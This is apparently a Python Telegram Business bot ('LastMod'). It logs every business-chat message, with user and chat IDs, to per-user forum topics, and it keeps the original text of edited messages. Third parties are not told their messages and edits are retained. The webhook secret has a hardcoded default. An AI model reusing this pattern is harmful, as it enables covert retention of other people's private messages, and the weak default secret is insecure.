# ================== IMPORTS ==================

import os
import logging

from fastapi import FastAPI, Request
from aiogram import Bot, Dispatcher
from aiogram.types import Update


# ================== SETTINGS ==================

BOT_TOKEN = os.getenv("BOT_TOKEN")
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "lastmod-secret")


# ================== LOGGING ==================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)

logger = logging.getLogger(__name__)


# ================== BOT ==================

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not configured")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# ================== FASTAPI ==================

app = FastAPI()


# ================== MESSAGE STORAGE ==================

message_history = {}

# Связь Business-подключения с топиком в LOG-группе
business_topics = {}


# ================== LOG CHAT ID ==================

@dp.message()
async def detect_log_chat(message):
    logger.info(
        "LOG CHAT | chat_id=%s | title=%s | type=%s",
        message.chat.id,
        message.chat.title,
        message.chat.type,
    )
    # ================== CHECK LOG FORUM ==================

@dp.message()
async def check_log_forum(message):
    if str(message.chat.id) != str(LOG_CHAT_ID):
        return

    try:
        chat = await bot.get_chat(int(LOG_CHAT_ID))

        logger.info(
            "LOG CHAT CHECK | id=%s | type=%s | is_forum=%s | title=%s",
            chat.id,
            chat.type,
            getattr(chat, "is_forum", None),
            chat.title,
        )

    except Exception as e:
        logger.exception(
            "LOG CHAT CHECK ERROR | %s",
            e,
        )
    # ================== BUSINESS CONNECTIONS ==================

@dp.business_connection()
async def handle_business_connection(connection):
    business_connection_id = connection.id
    user = connection.user

    logger.info(
        "BUSINESS CONNECTION | id=%s | user_id=%s | name=%s %s",
        business_connection_id,
        user.id,
        user.first_name,
        user.last_name or "",
    )

    # Если для этого подключения топик уже существует —
    # ничего не создаём.
    if business_connection_id in business_topics:
        return

    if not LOG_CHAT_ID:
        logger.error("LOG_CHAT_ID is not configured")
        return

    try:
        topic = await bot.create_forum_topic(
            chat_id=int(LOG_CHAT_ID),
            name=f"👤 {user.first_name}",
        )

        business_topics[business_connection_id] = topic.message_thread_id

        logger.info(
            "BUSINESS TOPIC CREATED | connection=%s | topic_id=%s",
            business_connection_id,
            topic.message_thread_id,
        )

    except Exception as e:
        logger.exception(
            "BUSINESS TOPIC CREATE ERROR | connection=%s | error=%s",
            business_connection_id,
            e,
        )
        
        
# ================== BUSINESS MESSAGES ==================

LOG_CHAT_ID = os.getenv("LOG_CHAT_ID")


@dp.business_message()
async def handle_business_message(message):
    key = (message.chat.id, message.message_id)

    text = message.text or message.caption or ""

    message_history[key] = {
        "text": text,
    }

    logger.info(
        "NEW MESSAGE | chat=%s | message=%s | text=%s",
        message.chat.id,
        message.message_id,
        text,
    )

    # ================== GET BUSINESS OWNER ==================

    business_connection = await bot.get_business_connection(
        business_connection_id=message.business_connection_id
    )

    user = business_connection.user

    # ================== CREATE USER TOPIC ==================

    topic_id = business_topics.get(message.business_connection_id)

    if topic_id is None:
        try:
            topic = await bot.create_forum_topic(
                chat_id=int(LOG_CHAT_ID),
                name=f"👤 {user.first_name}",
            )

            topic_id = topic.message_thread_id

            business_topics[message.business_connection_id] = topic_id

            logger.info(
                "BUSINESS TOPIC CREATED | connection=%s | topic_id=%s | user=%s",
                message.business_connection_id,
                topic_id,
                user.id,
            )

        except Exception as e:
            logger.exception(
                "BUSINESS TOPIC CREATE ERROR | connection=%s | error=%s",
                message.business_connection_id,
                e,
            )
            return

    # ================== SAVE MESSAGE TO USER TOPIC ==================

    try:
        await bot.send_message(
            chat_id=int(LOG_CHAT_ID),
            message_thread_id=topic_id,
            text=(
                "📥 НОВОЕ СООБЩЕНИЕ\n\n"
                f"👤 {user.first_name} {user.last_name or ''}\n"
                f"🆔 User ID: {user.id}\n"
                f"🔑 Business connection: {message.business_connection_id}\n"
                f"💬 Chat ID: {message.chat.id}\n"
                f"🆔 Message ID: {message.message_id}\n\n"
                f"📝 Текст:\n{text or '[без текста]'}"
            ),
        )

        logger.info(
            "LOG SAVED | connection=%s | topic=%s | original_message=%s",
            message.business_connection_id,
            topic_id,
            message.message_id,
        )

    except Exception as e:
        logger.exception("LOG SAVE ERROR: %s", e)

    # ================== SAVE TO TELEGRAM LOG ==================

    if LOG_CHAT_ID:
        try:
            await bot.send_message(
                chat_id=int(LOG_CHAT_ID),
                text=(
                    "📥 НОВОЕ СООБЩЕНИЕ\n\n"
                    f"👤 Business connection: {message.business_connection_id}\n"
                    f"💬 Chat ID: {message.chat.id}\n"
                    f"🆔 Message ID: {message.message_id}\n\n"
                    f"📝 Текст:\n{text or '[без текста]'}"
                ),
            )

            logger.info(
                "LOG SAVED | original_chat=%s | original_message=%s",
                message.chat.id,
                message.message_id,
            )

        except Exception as e:
            logger.exception("LOG SAVE ERROR: %s", e)


# ================== EDITED BUSINESS MESSAGES ==================

@dp.edited_business_message()
async def handle_edited_business_message(message):
    key = (message.chat.id, message.message_id)

    old_data = message_history.get(key)
    old_text = old_data["text"] if old_data else "[старый текст не сохранён]"

    new_text = message.text or message.caption or ""

    logger.info(
        "MESSAGE EDITED | chat=%s | message=%s\n"
        "BEFORE: %s\n"
        "AFTER: %s",
        message.chat.id,
        message.message_id,
        old_text,
        new_text,
    )

    message_history[key] = {
        "text": new_text,
    }


# ================== WEBHOOK ==================

@app.get("/")
async def root():
    return {
        "status": "online",
        "service": "LastMod Business Bot",
    }


@app.post("/webhook")
async def telegram_webhook(request: Request):
    secret = request.headers.get("X-Telegram-Bot-Api-Secret-Token")

    if secret != WEBHOOK_SECRET:
        return {"ok": False}

    data = await request.json()

    update = Update.model_validate(data)

    await dp.feed_update(bot, update)

    return {"ok": True}


# ================== STARTUP ==================

@app.on_event("startup")
async def startup():
    webhook_url = "https://kusuo-saiki.onrender.com/webhook"

    await bot.set_webhook(
        url=webhook_url,
        secret_token=WEBHOOK_SECRET,
    )

    logger.info("LastMod Business Bot started")
    logger.info("Webhook set: %s", webhook_url)


# ================== SHUTDOWN ==================

@app.on_event("shutdown")
async def shutdown():
    await bot.session.close()
    logger.info("LastMod Business Bot stopped")